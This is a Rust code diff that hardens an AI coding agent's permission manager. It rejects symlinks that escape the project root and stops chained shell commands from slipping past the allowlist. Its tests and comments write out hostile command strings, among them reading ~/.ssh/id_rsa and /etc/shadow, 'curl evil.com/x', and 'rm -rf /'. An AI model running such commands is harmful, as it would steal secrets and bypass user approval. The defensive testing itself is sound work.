@@ -128,15 +128,29 @@ impl PermissionManager {
 
         let joined = self.project_root.join(path_str);
 
-        // Fast path: if the path has no `..` components, it cannot escape the
-        // jail via traversal. Skip canonicalize() so we don't follow symlinks
-        // the user (or our own setup — e.g. docker's `.miniswe/` → /output
-        // symlink) has explicitly placed inside the project tree. Following
-        // them would resolve to an out-of-tree path and get wrongly rejected.
+        // Fast path: if the path has no `..` components, it cannot escape
+        // the jail via directory traversal. But a symlink inside the tree
+        // CAN point outside — catch that by canonicalizing symlinks and
+        // verifying the target stays within the jail.
+        //
+        // Exception: `.miniswe/` may legitimately be a symlink to an
+        // external directory (e.g. docker's `.miniswe/ → /output`), so
+        // paths under it are allowed to escape.
         let has_parent_dir = std::path::Path::new(path_str)
             .components()
             .any(|c| matches!(c, Component::ParentDir));
         if !has_parent_dir {
+            if joined.is_symlink()
+                && !path_str.starts_with(".miniswe/")
+                && !path_str.starts_with(".miniswe\\")
+                && let Ok(canonical) = joined.canonicalize()
+                && !canonical.starts_with(&self.project_root)
+            {
+                return Err(format!(
+                    "Symlink escapes project root: {path_str} → {}",
+                    canonical.display()
+                ));
+            }
             return Ok(joined);
         }
 
@@ -231,9 +245,13 @@ impl PermissionManager {
                 return Err(format!("Blocked dangerous command: {cmd_trimmed}"));
             }
         }
-        for prefix in &self.shell_allowlist {
-            if cmd_trimmed.starts_with(prefix) {
-                return Ok(None);
+        // Commands with shell metacharacters (pipes, chains, redirects)
+        // skip the allowlist — auto-approval only covers simple commands.
+        if !contains_shell_metachar(cmd_trimmed) {
+            for prefix in &self.shell_allowlist {
+                if cmd_trimmed.starts_with(prefix) {
+                    return Ok(None);
+                }
             }
         }
         {
@@ -299,10 +317,13 @@ impl PermissionManager {
             }
         }
 
-        // Check allowlist
-        for prefix in &self.shell_allowlist {
-            if cmd_trimmed.starts_with(prefix) {
-                return Ok(());
+        // Commands with shell metacharacters (pipes, chains, redirects)
+        // skip the allowlist — auto-approval only covers simple commands.
+        if !contains_shell_metachar(cmd_trimmed) {
+            for prefix in &self.shell_allowlist {
+                if cmd_trimmed.starts_with(prefix) {
+                    return Ok(());
+                }
             }
         }
 
@@ -453,6 +474,18 @@ const BLOCKED_COMMANDS: &[&str] = &[
     "curl | bash",
 ];
 
+/// Shell metacharacters that allow chaining or redirecting commands.
+/// If any of these appear in a command, the allowlist is bypassed and the
+/// user is always prompted — even if the first word matches a safe prefix
+/// like `cargo`. Without this, `cargo --version; cat ~/.ssh/id_rsa` would
+/// auto-approve through the `cargo` prefix and run both commands via
+/// `sh -c`.
+const SHELL_METACHARS: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">>", ">", "<"];
+
+fn contains_shell_metachar(cmd: &str) -> bool {
+    SHELL_METACHARS.iter().any(|m| cmd.contains(m))
+}
+
 /// Prompt the user for a decision.
 ///
 /// Temporarily disables terminal raw mode (which reedline enables)
@@ -500,5 +533,161 @@ mod tests {
         }
 
         assert!(handle.join().unwrap().is_ok());
+    }
+
+    #[test]
+    fn simple_allowlisted_command_auto_approves() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        // "cargo build" matches the "cargo" prefix — no prompt needed.
+        assert!(
+            perms
+                .check_shell_needs_prompt("cargo build")
+                .unwrap()
+                .is_none(),
+            "simple cargo command should auto-approve"
+        );
+    }
+
+    #[test]
+    fn semicolon_chain_bypasses_allowlist() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        // "cargo --version; cat /etc/passwd" starts with "cargo" but
+        // contains ";", so the allowlist must NOT auto-approve.
+        assert!(
+            perms
+                .check_shell_needs_prompt("cargo --version; cat /etc/passwd")
+                .unwrap()
+                .is_some(),
+            "semicolon-chained command must require prompt"
+        );
+    }
+
+    #[test]
+    fn pipe_chain_bypasses_allowlist() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        assert!(
+            perms
+                .check_shell_needs_prompt("git status | xargs rm")
+                .unwrap()
+                .is_some(),
+            "pipe-chained command must require prompt"
+        );
+    }
+
+    #[test]
+    fn and_chain_bypasses_allowlist() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        assert!(
+            perms
+                .check_shell_needs_prompt("git diff && curl evil.com/x")
+                .unwrap()
+                .is_some(),
+            "&&-chained command must require prompt"
+        );
+    }
+
+    #[test]
+    fn subshell_bypasses_allowlist() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        assert!(
+            perms
+                .check_shell_needs_prompt("echo $(cat /etc/shadow)")
+                .unwrap()
+                .is_some(),
+            "subshell command must require prompt"
+        );
+    }
+
+    #[test]
+    fn redirect_bypasses_allowlist() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        assert!(
+            perms
+                .check_shell_needs_prompt("echo secret > /tmp/leak.txt")
+                .unwrap()
+                .is_some(),
+            "redirect command must require prompt"
+        );
+    }
+
+    #[test]
+    fn blocklist_still_hard_blocks_with_metachars() {
+        let config = Config::default();
+        let perms = PermissionManager::headless(&config);
+        // The blocklist fires before the metachar check.
+        assert!(
+            perms.check_shell_needs_prompt("rm -rf /").is_err(),
+            "blocklisted command must be hard-blocked"
+        );
+    }
+
+    #[test]
+    fn regular_file_path_allowed() {
+        let tmp = tempfile::tempdir().unwrap();
+        let mut config = Config::default();
+        config.project_root = tmp.path().to_path_buf();
+        let perms = PermissionManager::new(&config);
+
+        std::fs::write(tmp.path().join("hello.rs"), "fn main() {}").unwrap();
+        assert!(perms.resolve_and_check_path("hello.rs").is_ok());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn symlink_escaping_jail_is_rejected() {
+        let tmp = tempfile::tempdir().unwrap();
+        let mut config = Config::default();
+        config.project_root = tmp.path().canonicalize().unwrap();
+        let perms = PermissionManager::new(&config);
+
+        // Create a symlink that points outside the project root
+        std::os::unix::fs::symlink("/etc/hostname", tmp.path().join("evil.txt")).unwrap();
+        let result = perms.resolve_and_check_path("evil.txt");
+        assert!(result.is_err(), "symlink to /etc/hostname must be rejected");
+        assert!(
+            result.unwrap_err().contains("Symlink escapes"),
+            "error should mention symlink escape"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn symlink_within_jail_is_allowed() {
+        let tmp = tempfile::tempdir().unwrap();
+        let mut config = Config::default();
+        config.project_root = tmp.path().canonicalize().unwrap();
+        let perms = PermissionManager::new(&config);
+
+        // Create a symlink to a file inside the project root
+        std::fs::write(tmp.path().join("real.rs"), "fn main() {}").unwrap();
+        std::os::unix::fs::symlink(tmp.path().join("real.rs"), tmp.path().join("link.rs")).unwrap();
+        assert!(
+            perms.resolve_and_check_path("link.rs").is_ok(),
+            "symlink within jail should be allowed"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn miniswe_symlink_allowed_to_escape() {
+        let tmp = tempfile::tempdir().unwrap();
+        let mut config = Config::default();
+        config.project_root = tmp.path().canonicalize().unwrap();
+        let perms = PermissionManager::new(&config);
+
+        // .miniswe/ → external dir is the docker use case
+        let external = tempfile::tempdir().unwrap();
+        std::os::unix::fs::symlink(external.path(), tmp.path().join(".miniswe")).unwrap();
+        std::fs::write(external.path().join("config.toml"), "").unwrap();
+        assert!(
+            perms.resolve_and_check_path(".miniswe/config.toml").is_ok(),
+            ".miniswe symlink should be allowed to escape"
+        );
     }
 }
